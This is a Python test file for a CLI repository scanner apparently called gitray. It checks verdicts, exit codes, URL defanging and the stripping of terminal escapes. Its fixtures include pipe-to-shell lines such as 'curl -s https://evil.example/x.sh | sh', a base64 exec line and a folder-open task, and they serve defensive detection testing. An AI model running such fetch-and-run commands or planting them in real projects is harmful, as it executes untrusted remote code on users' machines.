import json
import subprocess
import sys

import pytest

from gitray import cli
from tests.conftest import FakeGitHub, TarBuilder, make_tarball

TARGET = "github.com/octo/demo"


def run(fake: FakeGitHub, *args: str) -> int:
    return cli.main([*args, TARGET], transport=fake.transport())


def test_clean_repo_exits_0(fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]) -> None:
    assert run(fake_github) == 0
    out = capsys.readouterr().out
    assert "Verdict: CLEAN" in out
    assert "octo/demo" in out


def test_suspicious_repo_exits_1(fake_github: FakeGitHub) -> None:
    fake_github.tarball = make_tarball({".vscode/tasks.json": '{"runOn": "folderOpen"}'})
    assert run(fake_github) == 1


def test_dangerous_repo_exits_2(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball(
        {
            "install.sh": "curl -s https://evil.example/x.sh | sh\n",
            "src/run.py": 'exec(base64.b64decode("cHJpbnQoMSk="))\n',
        }
    )
    assert run(fake_github) == 2
    out = capsys.readouterr().out
    assert "Verdict: DANGEROUS" in out
    assert "install.sh:1" in out
    # URLs from the scanned repo are never shown clickable.
    assert "https://evil.example" not in out
    assert "hxxps://evil[.]example" in out


def test_json_output_is_defanged(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball({"README.md": "Get https://bit.ly/abc\n"})
    run(fake_github, "--json")
    data = json.loads(capsys.readouterr().out)
    assert data["verdict"] == "clean"
    assert data["findings"][0]["snippet"] == "Get hxxps://bit[.]ly/abc"
    assert data["complete"] is True


def test_terminal_escapes_in_repo_content_are_removed(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = make_tarball(
        {"x\x1b[2J.sh": "curl https://e.example/a | sh \x1b]0;pwn\x07\n"}
    )
    run(fake_github)
    out = capsys.readouterr().out
    assert "\x1b" not in out and "\x07" not in out


def test_partial_scan_is_reported(
    fake_github: FakeGitHub, capsys: pytest.CaptureFixture[str]
) -> None:
    fake_github.tarball = (
        TarBuilder().file("a.sh", "curl x | sh\n").zeros("z.bin", 3 * 1024 * 1024).build()
    )
    code = run(fake_github, "--max-total-mb", "1")
    out = capsys.readouterr().out
    assert "WARNING: partial scan" in out
    assert code == 1  # the finding read before the limit still counts


# --- exit code 3 for every kind of error --------------------------------------


def test_no_arguments_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main([]) == 3
    assert "usage:" in capsys.readouterr().err


def test_unknown_flag_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["--no-such-flag", TARGET]) == 3


def test_bad_flag_value_exits_3() -> None:
    assert cli.main(["--max-files", "lots", TARGET]) == 3


def test_invalid_target_exits_3(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["gitlab.com/x/y"]) == 3
    assert "not a GitHub repository" in capsys.readouterr().err


def test_github_error_exits_3(fake_github: FakeGitHub) -> None:
    assert cli.main(["github.com/octo/missing"], transport=fake_github.transport()) == 3


def test_unexpected_exception_exits_3(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def boom(*a: object, **k: object) -> None:
        raise RuntimeError("boom")

    monkeypatch.setattr(cli, "scan_repo", boom)
    assert run(fake_github) == 3
    err = capsys.readouterr().err
    assert "unexpected error: RuntimeError" in err
    assert "Traceback" not in err


def test_unexpected_exception_traceback_with_debug(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    def boom(*a: object, **k: object) -> None:
        raise RuntimeError("boom")

    monkeypatch.setattr(cli, "scan_repo", boom)
    assert run(fake_github, "--debug") == 3
    assert "Traceback" in capsys.readouterr().err


def test_keyboard_interrupt_exits_3(
    fake_github: FakeGitHub, monkeypatch: pytest.MonkeyPatch
) -> None:
    def interrupt(*a: object, **k: object) -> None:
        raise KeyboardInterrupt

    monkeypatch.setattr(cli, "scan_repo", interrupt)
    assert run(fake_github) == 3


def test_help_exits_0(capsys: pytest.CaptureFixture[str]) -> None:
    assert cli.main(["--help"]) == 0
    assert "Exit codes" in capsys.readouterr().out


def test_python_dash_m_uses_exit_code_3_for_argparse_errors() -> None:
    # Runs our own CLI (not scanned code) to check the real process exit code.
    proc = subprocess.run(
        [sys.executable, "-m", "gitray", "--no-such-flag"],
        capture_output=True,
        check=False,
    )
    assert proc.returncode == 3
